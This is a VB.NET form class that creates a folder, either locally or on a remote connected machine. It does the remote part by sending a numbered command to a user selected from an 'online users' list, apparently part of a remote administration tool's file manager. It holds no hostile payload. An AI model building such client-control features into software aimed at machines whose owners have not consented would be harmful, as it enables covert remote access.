Public Class FilemanagerCreateFolder

    Private Sub ButtonCancel_Click(sender As Object, e As EventArgs) Handles ButtonCancel.Click
        Me.Close()
    End Sub

    Private Sub ButtonRename_Click(sender As Object, e As EventArgs) Handles ButtonRename.Click
        Dim ParentPath As String

        ' These chars are nto allowed to be in the foldername
        Dim InvalidChars() As String = {"|", ";", "&", "<", ">", "*", "/", "\", ":", "{", "}", "[", "]"}
        If TextBox1.Text = String.Empty Then
            MsgBox("Enter a valid directory name.", MsgBoxStyle.Exclamation)
            Exit Sub
        End If
        For Each c As String In InvalidChars
            If TextBox1.Text.Contains(c) Then
                MsgBox("Enter a valid directory name.", MsgBoxStyle.Exclamation)
                Exit Sub
            End If
        Next

        ' Folder Creation begins here


        'Try

        'Catch ex As Exception
        'MsgBox("No File/Folder selected." & ex.Message, MsgBoxStyle.Exclamation)
        'Exit Sub
        ' End Try

        If Filemanager.CreateFolderLocal = True Then
            ParentPath = IO.Directory.GetParent(Filemanager.TextBoxLocalAdressBar.Text).FullName
            Try

                IO.Directory.CreateDirectory(ParentPath & "\" & TextBox1.Text)
                MsgBox("Directory created with success.", MsgBoxStyle.Information)
            Catch ex As Exception
                MsgBox("Failed creating directory.", MsgBoxStyle.Critical)
            End Try
        Else
            ParentPath = IO.Directory.GetParent(Filemanager.TextBoxRemoteAdressBar.Text).FullName
            If Main.ListViewMain.Items.Count > 0 Then
                If Main.ListViewMain.SelectedItems.Count <> 0 Then _
                    Main.SelectedUserID = Main.ListViewMain.SelectedItems(0).Text
            Else
                MsgBox("No Users online.", MsgBoxStyle.Exclamation)
            End If
            Try
                Main.WriteData(ParentPath & "\" & TextBox1.Text)
                Main.WriteCommand(Main.SelectedUserID & "|28")
                Waiting.ShowDialog()
            Catch x As Exception
                MsgBox("Unable to Send Command." & x.Message, MsgBoxStyle.OkOnly, "Create Folder")
            End Try
        End If

    End Sub

End Class